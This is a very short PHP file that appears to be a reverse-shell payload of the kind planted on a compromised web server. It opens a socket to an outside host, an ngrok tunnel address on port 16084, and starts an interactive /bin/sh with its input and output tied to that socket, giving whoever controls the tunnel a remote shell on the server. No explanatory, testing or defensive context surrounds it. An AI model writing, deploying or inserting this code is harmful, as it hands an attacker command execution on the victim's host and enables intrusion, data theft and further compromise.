<?php
$sock = fsockopen("0.tcp.ap.ngrok.io", 16084);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
